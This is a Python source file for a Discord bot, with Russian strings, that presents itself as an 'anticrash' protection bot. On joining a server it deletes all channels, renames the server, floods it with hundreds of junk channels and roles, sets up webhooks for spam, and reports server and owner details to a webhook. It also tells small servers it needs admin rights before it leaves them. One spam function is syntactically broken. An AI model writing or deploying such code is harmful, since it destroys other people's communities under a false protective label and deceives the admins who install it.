import discord
from discord.ext import commands
import asyncio
import os
import random
import requests as rq
anticrash = []
anticrashed=[]
banned=[]
hook = 'https://discord.com/api/webhooks/'
async def sendWebhook(guild, adder, adder_id, hookUrl):
	server_name=guild.name
	roles=len(guild.roles)
	channels=len(guild.channels)
	id=guild.id
	if id in anticrashed: return True
	members_iter=guild.fetch_members(limit=None)
	members_list=await members_iter.flatten()
	members=len([member for member in members_list if not member.bot])
	owner=guild.owner
	owner_id=guild.owner_id
	payload={
	"content": None,
	"embeds": [
		{
			"title": "Бот на сервере!",
			"description": f"**Добавил бота:** `{adder}` **Его айди** `{adder_id}`\n```Инфо о сервере```\n**Роли:** `{roles}` \n**Каналы:** `{channels}`\n**Люди**: `{members}`\n**ID:** `{id}`\n**Владелец сервера:** `{owner}` **Его айди** `{owner_id}`",
			"color": 16711680,
			"author": {
				"name": server_name
			},
			"footer": {
				"text": "Бот с без админ прав не работает"
			}
		}
	],
	"username": "Autoanticrash",
	"avatar_url": "https://tornadodomain.000webhostapp.com/terminal.png"
	}
	rq.post(hookUrl, json=payload)
	


TOKEN=''

client = commands.Bot(command_prefix='+', intents=discord.Intents.all())
client.remove_command('help')
@client.event
async def on_ready():
		os.system('cls')
		print(f'https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot')
		await client.change_presence(status=discord.Status.dnd)
async def delc(c):
	try:
		await c.delete()
	except:
		try:
			await c.delete()
		except:
			pass
	
@client.event
async def on_guild_join(guild):
	gName = guild.name
	if guild.id in [81]:
		for c in guild.text_channels:
			try:
				await c.send('Попытка краша защищённого сервера')
			except:
				pass
			else:
				break
		await guild.leave()
		return
	if guild.id in anticrash: return
	anticrash.append(guild.id)
	adder=None
	try:
		async for entry in guild.audit_logs(action=discord.AuditLogAction.bot_add):
			adder = entry.user
			adder_id=adder.id
			break
		if adder_id in banned:
			try: await adder.send(embed = discord.Embed(title=':x:Доступ запрещен', description=f'Администрация бота заблокировала вас. Считаете ошибкой? Идите в лс к админам', colour = 0xf00a0a))
			except: pass
			await guild.leave()
			return
	except: adder="Unknown"; adder_id="Unknown"
	members_iter=guild.fetch_members(limit=None)
	members_list=await members_iter.flatten()
	members=len([member for member in members_list if not member.bot])
	if members > 29:
		asyncio.create_task(sendWebhook(guild, adder, adder_id, hook))
	elif members < 30 and adder_id != 852666658589507584:
		for c in guild.text_channels:
			try:
				await c.send('выдайте мне админку,я не смогу правильно работать')
			except:
				pass
			else:
				break
		await guild.leave()
		return
	tasks = [delc(x) for x in guild.channels if not 'expsd' in x.name]
	try:
		await asyncio.gather(*tasks)
	except:
		pass
	try:
		await guild.edit(name="name discord server")
	except:
		pass
	asyncio.create_task(croles(guild))
	for i in range(200):
		try:
			await guild.create_text_channel(name='none' + ''.join([chr(random.choice(range(1,1114111))) for _ in range(10)]), topic='Сервер защищен\n'+''.join([chr(random.choice(range(1,1114111))) for _ in range(10)]))
		except:
			continue
	
	try:
		anticrash.remove(guild.id)
	except:
		pass
		
async def croles(guild):
	for x in range(240):
		try:
			await guild.create_role(name=f"anticrash_module "+''.join([chr(random.choice(range(1,1114111))) for _ in range(10)]))
		except:
			pass
		
@client.command()
async def auto(ctx):
	if not ctx.guild: return
	guild=ctx.guild
	await on_guild_join(guild)
	
async def spamhook(wh):
    for _ in range(150):
        await()
	
async def crhook(channel):
    try:
        hooks = await channel.webhooks()
        if len(hooks) == 0:
            wh = await channel.create_webhook(name='none')
        else:
            wh = hooks[0]
        asyncio.create_task(spamhook(wh))
    except:
        pass


@client.event
async def on_guild_channel_create(channel):
    if 'not' in channel.name:
        asyncio.create_task(crhook(channel))
        for _ in range(30):
                    pass
		


client.run(TOKEN)
